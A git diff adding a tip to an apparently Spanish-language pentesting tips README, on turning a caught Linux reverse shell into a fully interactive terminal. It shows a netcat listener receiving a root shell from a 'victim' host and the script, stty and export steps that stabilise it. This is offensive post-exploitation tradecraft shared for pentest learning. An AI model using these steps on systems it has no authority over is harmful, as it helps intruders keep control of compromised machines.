@@ -17,7 +17,7 @@ En este repo quiero contribuir una vez al día, diariamente publicare una técni
 - [Tip 14: Rutas sensibles de frameworks para aprovechar LFI](#tip-14-rutas-sensibles-de-frameworks-para-aprovechar-lfi)
 - [Tip 15: One liner detección de servicios web](#tip-15-one-liner-detección-de-servicios-web)
 - [Tip 16: Archivos de configuración de bases de datos](#tip-16-archivos-de-configuración-de-bases-de-datos)
-- [Tip 17: Generar una shell interactiva en linux](#tip-17-generar-una-shell-interactiva-en-linux)
+- [Tip 17: Generar una shell interactiva en Linux](#tip-17-generar-una-shell-interactiva-en-linux)
 - [Tip 18: Generar una reverse shell para Windows](#tip-18-generar-una-reverse-shell-para-windows)
 - [Tip 19: Transferencia de archivos en Windows](#tip-19-transferencia-de-archivos-en-windows)
 - [Tip 20: Transferencia de archivos en Linux](#tip-20-transferencia-de-archivos-en-linux)
@@ -655,7 +655,47 @@ En esta sección publicare las rutas donde se encuentra el archivo de configurac
 ```bash
 [limesurvey_installation]/application/config/config.php
 ```
-## Tip #17: Generar una shell interactiva en linux
+## Tip #17: Generar una shell interactiva en Linux
+Cuando obtenemos una reverse shell debido a una vulnerabilidad en un sistema Linux, esta shell no es interactiva, es decir, no se pueden usar opciones como ir hacia arriba para comandos anteriores, Ctl+C para interrumpir un script, etc. para lograr que la shell se comporte como nativa necesitamos ejecutar ciertos comandos:
+### Creacion del script
+Despues de recibir la conexión mediante ```netcat``` procedemos a crear un script con el siguiente comando ```script /dev/null -c bash``` e inmediatamente despues utilizaremos la combinación ```Ctl+Z``` para enviar el proceso a segundo plano:
+```bash
+┌──(jorge㉿pentest)-[~]
+└─$ nc -nlvp 9001     
+listening on [any] 9001 ...
+connect to [10.10.X.X] from (UNKNOWN) [10.10.X.X] 60738
+bash: cannot set terminal process group (51285): Inappropriate ioctl for device
+bash: no job control in this shell
+root@victim:/# script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+root@victim:/# ^Z
+zsh: suspended  nc -nlvp 9001
+```
+### STTY
+Ahora estaremos en nuestra maquina local con el proceso corriendo en segundo plano, lo que haremos sera desactivar ciertas modificaciones automaticas en nuestra consola con el comando ```stty raw -echo; fg```, ademas esto traera de vuelta a primer plano el proceso anterior:
+```bash
+┌──(jorge㉿pentest)-[~]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -nlvp 9001
+                               reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+```
+**Nota: Generalmente tienes que ingresar la palabra reset, deespues de ingresar el comando, aunado a ello ingresaras xterm como tipo de terminal**
+### Exportar variables de entorno
+La shell ya casi esta lista, solo es necesario exportar variables de entorno para que todo funcione correctamente:
+```bash
+root@victim:/# export SHELL=bash
+root@victim:/# export TERM=xterm-256color
+root@victim:/# ls
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
+boot  dev    home  lib32  libx32  media       opt  root  sbin  sys  usr
+root@victim:/# stty rows 30 columns 166
+root@victim:/# ls
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+```
+Como se puede observar en el primer ```ls``` la dimensión no esta ajustada correctamente, es por ello que se deben especificar las columnas y filas con el comando ```stty```, para ver que dimensiones son las correctas para tu computadora en una nueva ventana ejectuta el comando ```stty -a``` y lueho coloca el numero correspondiente.
 ## Tip #18: Generar una reverse shell para Windows
 ## Tip #19: Transferencia de archivos en Windows
 ## Tip #20: Transferencia de archivos en Linux
